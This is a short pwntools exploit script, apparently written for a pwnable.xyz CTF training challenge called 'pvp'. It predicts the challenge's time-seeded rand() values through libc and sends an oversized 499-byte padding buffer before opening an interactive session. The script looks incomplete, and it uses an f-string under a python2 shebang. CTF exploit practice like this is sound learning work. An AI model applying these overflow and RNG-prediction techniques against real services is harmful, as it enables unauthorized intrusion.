#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
from ctypes import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/train/pwnable.xyz/pvp/image/challenge/challenge")
elf = ELF(TARGET)
libc_call = CDLL("/usr/lib/x86_64-linux-gnu/libc-2.31.so")


def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def long_append(char):
    r.sendlineafter(">","2")
    r.sendlineafter("chars:",char)

def short_append(char):
    r.sendlineafter(">","1")
    r.sendlineafter("chars:",char)

def save_it(nbytes):
    r.sendlineafter(">","3")
    r.sendlineafter("message?",str(nbytes))

def exploit(r):
    attach(r)
    for i in range(0xf):
        libc_call.srand(libc_call.time(0))
        short_rand = libc_call.rand() % 32
        long_rand = libc_call.rand() % 1023
        log.info(f"short_rand: " + str(short_rand))
        log.info(f"long_rand: " + str(long_rand))

        if long_rand > 500:
            long_append(b"A" * 499)
            r.interactive()
        else:
            r.sendlineafter(">","9")
            continue
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("127.0.0.1", 1337)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
